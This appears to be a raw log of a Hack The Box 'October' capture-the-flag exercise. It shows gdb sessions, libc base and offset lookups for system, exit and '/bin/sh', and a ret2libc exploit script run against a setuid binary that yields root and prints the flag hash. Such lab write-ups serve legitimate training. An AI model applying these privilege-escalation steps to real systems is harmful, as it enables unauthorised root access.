       0x555555555148:      nop    DWORD PTR [rax+rax*1+0x0]
    Guessed arguments:
    arg[0]: 0x555555556004 --> 0x68732f6e69622f ('/bin/sh')
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffdfd0 --> 0x555555555150 (<__libc_csu_init>:     push   r15)
    0008| 0x7fffffffdfd8 --> 0x7ffff7e15d0a (<__libc_start_main+234>:       mov    edi,eax)
    0016| 0x7fffffffdfe0 --> 0x7fffffffe0c8 --> 0x7fffffffe3e7 ("/home/kali/HTB/Machines/October_NF/retlibc")
    0024| 0x7fffffffdfe8 --> 0x100000000
    0032| 0x7fffffffdff0 --> 0x555555555135 (<main>:        push   rbp)
    0040| 0x7fffffffdff8 --> 0x7ffff7e157cf (<init_cacheinfo+287>:  mov    rbp,rax)
    0048| 0x7fffffffe000 --> 0x0
    0056| 0x7fffffffe008 --> 0xb9c39bcdef6f537c
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x0000555555555140 in main ()


gdb-peda$ si
gdb-peda$ quit


Command-Line: gdb ./retlibc
gdb-peda$

gdb-peda$ p system
Result:
    $1 = {<text variable, no debug info>} 0x1030 <system@plt>

gdb-peda$ searchmem /bin/sh
Result:
    Searching for '/bin/sh' in: None ranges
    Not found

gdb-peda$ r
Result:
    $

$ CMD+C
Result: gdb-peda$

gdb-peda$ searchmem /bin/sh
Result:
    Searching for '/bin/sh' in: None ranges
    Found 4 results, display max 4 items:
       dash : 0x55555556b46e --> 0x68732f6e69622f ('/bin/sh')
       libc : 0x7ffff7f79156 --> 0x68732f6e69622f ('/bin/sh')
    [stack] : 0x7fffffffe42e --> 0x68732f6e69622f ('/bin/sh')
    [stack] : 0x7fffffffeff0 --> 0x68732f6e69622f ('/bin/sh')


www-data@october:/lib/i386-linux-gnu$ ldd /usr/local/bin/ovrflw | grep libc
Result:
    ldd /usr/local/bin/ovrflw | grep libc
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7549000)

www-data@october:/lib/i386-linux-gnu$ ldd /usr/local/bin/ovrflw | grep libc
Result:
    ldd /usr/local/bin/ovrflw | grep libc
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb757e000)

www-data@october:/lib/i386-linux-gnu$ ldd /usr/local/bin/ovrflw | grep libc
Result:
    ldd /usr/local/bin/ovrflw | grep libc
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7637000)

www-data@october:/lib/i386-linux-gnu$ ldd /usr/local/bin/ovrflw | grep libc
Result:
    ldd /usr/local/bin/ovrflw | grep libc
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7606000)

www-data@october:/lib/i386-linux-gnu$ ldd /usr/local/bin/ovrflw | grep libc
Result:
    ldd /usr/local/bin/ovrflw | grep libc
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7586000)



www-data@october:/lib/i386-linux-gnu$ readelf -s ./libc.so.6 | grep system
Result:
    readelf -s ./libc.so.6 | grep system
       243: 0011b710    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
       620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
      1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

Notes: system address = 0x00040310


www-data@october:/lib/i386-linux-gnu$ readelf -s ./libc.so.6 | grep exit
Result:
    readelf -s ./libc.so.6 | grep exit
       111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
       139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
       446: 000336d0   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18
       554: 000b84f4    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
       609: 0011e5f0    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
       645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
       868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
      1037: 00128b50    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
      1380: 001ac204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
      1492: 000fb480    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
      2090: 001ac154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
      2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
      2386: 000fbff0     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2


Notess: exit address = 0x00033260

www-data@october:/lib/i386-linux-gnu$ strings -a -t x ./libc.so.6 |grep /bin/sh
Result:
    strings -a -t x ./libc.so.6 |grep /bin/sh
     162bac /bin/sh

Notes: arg_address = 0x00162bac

Notes: Modified '/buf.py'. Uploaded to target in path '/dev/shm/buf.py'.


www-data@october:/dev/shm$ python buf.py
Result:
    *** ROOT ACCESS ***

# cat /root/root.txt
Result:
    6bcb9cff749c9318d2a6e71bbcf30318
    *** ROOT OWNED ***

      *** FINISHED ***
